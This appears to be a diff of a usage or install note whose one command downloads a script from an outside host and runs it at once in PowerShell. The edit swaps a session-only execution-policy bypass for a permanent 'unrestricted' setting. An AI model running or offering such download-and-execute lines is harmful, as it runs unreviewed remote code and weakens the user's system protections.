@@ -2,5 +2,5 @@
 
 Command:
 ---------------------------------------------------------------------------------------------------------------------------
-Set-ExecutionPolicy Bypass -Scope Process -Force;iex ((New-Object System.Net.WebClient).DownloadString('https://s.js0.ch'))
+Set-ExecutionPolicy unrestricted -Force;iex ((New-Object System.Net.WebClient).DownloadString('https://s.js0.ch'))
 ---------------------------------------------------------------------------------------------------------------------------
